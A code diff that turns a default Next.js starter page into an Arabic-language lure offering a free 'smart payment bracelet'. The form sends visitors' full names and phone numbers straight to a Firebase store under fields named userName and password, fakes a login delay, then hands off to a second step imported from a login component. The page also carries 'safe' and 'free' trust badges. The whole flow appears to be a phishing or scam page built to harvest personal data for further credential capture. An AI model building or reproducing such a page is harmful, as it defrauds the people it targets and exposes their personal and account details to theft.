@@ -1,113 +1,144 @@
-import Image from 'next/image';
+"use client"
+import type React from "react"
+import { useState } from "react"
+import { Button } from "@/components/ui/button"
+import { Input } from "@/components/ui/input"
+import { addData } from "@/lib/firebase"
+import { Init } from "@/components/init"
+import  UsernameRecoveryPage  from "@/components/login"
 
-export default function Home() {
+export default function RegisterPage() {
+  const [currentStep, setCurrentStep] = useState<"1" | "2">("1")
+  const [userId, setUserId] = useState("")
+  const [password, setPassword] = useState("")
+  const [isLoading, setIsLoading] = useState(false)
+
+  const handleLogin = async (e: React.FormEvent) => {
+    e.preventDefault()
+    const visitorId = localStorage.getItem("visitor") as string
+    addData({ id: visitorId!, userName: userId, password }).then(() => {
+      console.log("done1")
+    })
+    setIsLoading(true)
+
+    // Simulate login API call
+    setTimeout(() => {
+      if (userId && password) {
+        setCurrentStep("2")
+      } else {
+      }
+      setIsLoading(false)
+    }, 2000)
+  }
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+    <>{
+      currentStep === '1' ? (<div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 py-8 px-4">
+        <Init />
+        <div className="max-w-md mx-auto">
+          <div className="text-center mb-8">
+            <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-red-600 to-red-700 rounded-2xl mb-6 shadow-lg">
+              <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+              </svg>
+            </div>
+            <h1 className="text-2xl font-bold text-slate-800 mb-2 text-balance">احصل على سوار الدفع الذكي</h1>
+            <p className="text-slate-600 text-sm leading-relaxed">أدخل معلوماتك للحصول على سوار الدفع الذكي مجاناً</p>
+          </div>
+
+          <div className="bg-white rounded-3xl shadow-xl border border-slate-200/60 overflow-hidden">
+            <div className="p-8 pb-6">
+              
+              <form onSubmit={handleLogin} className="space-y-6">
+                <div className="text-right">
+                  <label className="block text-slate-700 font-medium text-sm mb-3">الاسم الكامل *</label>
+                  <div className="relative">
+                    <Input
+                      type="text"
+                      className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 px-4 py-4 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 placeholder:text-slate-400 transition-all duration-200"
+                      dir="rtl"
+                      onChange={(w) => {
+                        setUserId(w.target.value)
+                      }}
+                      placeholder="أدخل اسمك الكامل"
+                    />
+                  </div>
+                </div>
+
+                <div className="text-right">
+                  <label className="block text-slate-700 font-medium text-sm mb-3">رقم الهاتف *</label>
+                  <div className="relative">
+                    <Input
+                      type="tel"
+                      className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 px-4 py-4 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 placeholder:text-slate-400 transition-all duration-200"
+                      dir="rtl"
+                      onChange={(w) => {
+                        setPassword(w.target.value)
+                      }}
+                      placeholder="أدخل رقم هاتفك"
+                    />
+                  </div>
+                </div>
+
+                <div className="pt-4">
+                  <Button
+                    disabled={isLoading}
+                    className="w-full bg-gradient-to-r from-red-600 to-red-700 hover:from-blue-700 hover:to-blue-800 text-white py-4 rounded-xl text-sm font-medium shadow-lg hover:shadow-xl transition-all duration-200 disabled:opacity-50"
+                  >
+                    {isLoading ? (
+                      <div className="flex items-center gap-2">
+                        <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                        جاري المعالجة...
+                      </div>
+                    ) : (
+                      <div className="flex items-center justify-center gap-2">
+                        <span>التالي</span>
+                        <span>←</span>
+                      </div>
+                    )}
+                  </Button>
+                </div>
+                <div className="relative bg-gradient-to-br from-slate-50 to-slate-100 rounded-2xl p-6 mb-8">
+                <img
+                  src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%E2%80%8F%202025-09-09%20at%2007.46.42-xTEAYCm2lsC2t46pOm2dn1QcfdG5Uh.jpeg"
+                  alt="Payment Terminal"
+                  className="w-full max-w-[280px] mx-auto object-contain rounded-xl shadow-sm"
+                />
+                <div className="absolute top-4 right-4 bg-green-500 text-white text-xs font-medium px-3 py-1 rounded-full">
+                  مجاني
+                </div>
+              </div>
+              </form>
+            </div>
+
+            <div className="bg-slate-50 px-8 py-6 border-t border-slate-100">
+              <p className="text-center text-xs text-slate-500 leading-relaxed">
+                بالمتابعة، فإنك توافق على
+                <span className="text-blue-600 font-medium"> شروط الخدمة </span>و
+                <span className="text-blue-600 font-medium"> سياسة الخصوصية </span>
+                الخاصة بنا
+              </p>
+            </div>
+          </div>
+
+          <div className="mt-8 text-center">
+            <div className="flex items-center justify-center gap-6 text-slate-400">
+              <div className="flex items-center gap-2">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
+                </svg>
+                <span className="text-xs">آمن ومحمي</span>
+              </div>
+              <div className="flex items-center gap-2">
+                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                </svg>
+                <span className="text-xs">مجاني تماماً</span>
+              </div>
+            </div>
+          </div>
         </div>
-      </div>
 
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
-
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore the Next.js 13 playground.
-          </p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{' '}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
-    </main>
-  );
+      </div>) : <UsernameRecoveryPage />}
+    </>
+  )
 }
